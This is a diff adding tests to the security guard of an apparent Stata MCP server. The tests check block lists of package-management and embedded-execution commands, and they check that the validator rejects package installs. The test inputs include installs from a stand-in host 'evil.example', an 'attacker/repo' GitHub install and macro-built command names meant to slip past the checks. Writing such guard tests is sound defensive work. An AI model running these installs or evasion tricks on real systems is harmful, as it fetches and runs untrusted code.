@@ -7,8 +7,8 @@ from pathlib import Path
 
 sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))
 
-from stata_mcp.guard.blacklist import DANGEROUS_COMMANDS
-from stata_mcp.guard.validator import GuardValidator
+from stata_mcp.guard.blacklist import DANGEROUS_COMMANDS, PACKAGE_MANAGEMENT_COMMANDS
+from stata_mcp.guard.validator import GuardValidator, PackageManagementGuardValidator
 
 
 def test_dangerous_command_abbreviations_are_blacklisted() -> None:
@@ -19,6 +19,52 @@ def test_dangerous_command_abbreviations_are_blacklisted() -> None:
 def test_embedded_execution_commands_are_blacklisted() -> None:
     expected = {"python", "mata", "java", "plugin"}
     assert expected.issubset(DANGEROUS_COMMANDS)
+
+
+def test_package_management_command_families_are_protected() -> None:
+    expected = {"ssc", "net", "github", "adoupdate", "update"}
+    assert expected.issubset(PACKAGE_MANAGEMENT_COMMANDS)
+
+
+def test_package_management_guard_rejects_direct_prefixed_and_macro_commands() -> None:
+    code = """
+ssc install reghdfe
+quietly: net install custompkg, from(https://evil.example/stata)
+version 18: net install custompkg, from(https://evil.example/stata)
+github install attacker/repo
+adoupdate, update all
+update all
+local pkgcmd "ssc"
+`pkgcmd' install estout
+"""
+
+    report = PackageManagementGuardValidator().validate(code)
+
+    assert report.is_safe is False
+    blocked_commands = {
+        item.content
+        for item in report.dangerous_items
+        if item.type == "command"
+    }
+    assert {"ssc", "net", "github", "adoupdate", "update"}.issubset(
+        blocked_commands
+    )
+    assert any(item.type == "macro" and item.content == "`pkgcmd'" for item in report.dangerous_items)
+
+
+def test_package_management_guard_rejects_dynamic_command_position_macro() -> None:
+    report = PackageManagementGuardValidator().validate(
+        'local prefix "n" + "et"\n`prefix\' install custompkg'
+    )
+
+    assert report.is_safe is False
+    assert any(item.type == "pattern" for item in report.dangerous_items)
+
+
+def test_package_management_guard_allows_normal_analysis_commands() -> None:
+    report = PackageManagementGuardValidator().validate("sysuse auto\nregress price mpg")
+
+    assert report.is_safe is True
 
 
 def test_colon_prefix_is_stripped_before_command_check() -> None:
